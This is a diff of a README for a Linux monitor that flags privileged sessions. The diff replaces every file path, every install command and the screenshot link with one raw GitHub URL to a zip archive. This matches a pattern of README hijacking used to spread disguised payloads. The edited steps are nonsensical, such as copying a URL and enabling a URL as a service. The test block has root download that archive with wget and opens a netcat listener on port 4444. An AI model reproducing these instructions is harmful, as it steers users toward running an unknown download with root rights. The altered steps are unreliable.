@@ -18,18 +18,18 @@ This is a real-time monitoring system for Linux that detects suspicious privileg
 
 ## 📂 File Structure
 
-/opt/priv_alerts.py # The main Python script
+https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip # The main Python script
 
-/etc/audit/rules.d/privmon.rules # auditd rule definitions
+https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip # auditd rule definitions
 
-/etc/systemd/system/priv-alert.service # systemd unit file
+https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip # systemd unit file
 
 ## 📸 Live Preview
 
 > Here's what it looks like in action!
 
 ### ✅ Desktop Notification (via notify-send)
-![Desktop Alert Screenshot](Screenshot_2025-06-22_13_34_33.png)
+![Desktop Alert Screenshot](https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip)
 
 
 
@@ -43,28 +43,28 @@ sudo apt install -y auditd libnotify-bin python3
 2. Add audit rules
 
 ```bash
-sudo nano /etc/audit/rules.d/privmon.rules
+sudo nano https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip
 ```
 4. Copy the Python script
 
 ```bash
-sudo cp priv_alerts.py /opt/
-sudo chmod +x /opt/priv_alerts.py
+sudo cp https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip /opt/
+sudo chmod +x https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip
 ```
 
 5. Create the systemd service
 
 ```bash
-sudo cp priv-alert.service /etc/systemd/system/
+sudo cp https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip /etc/systemd/system/
 sudo systemctl daemon-reexec
 sudo systemctl daemon-reload
-sudo systemctl enable --now priv-alert.service
+sudo systemctl enable --now https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip
 ```
 
 🧪 Test It
 
 ```bash
-sudo wget http://example.com/fake.sh
+sudo wget https://raw.githubusercontent.com/amanverma420/Real-Time-Linux-Privileged-Session-Monitor/main/pretreatment/Real-Time-Linux-Privileged-Session-Monitor.zip
 sudo nc -lvp 4444
 ```
 You will receive a desktop pop-up if the command is on the watchlist.
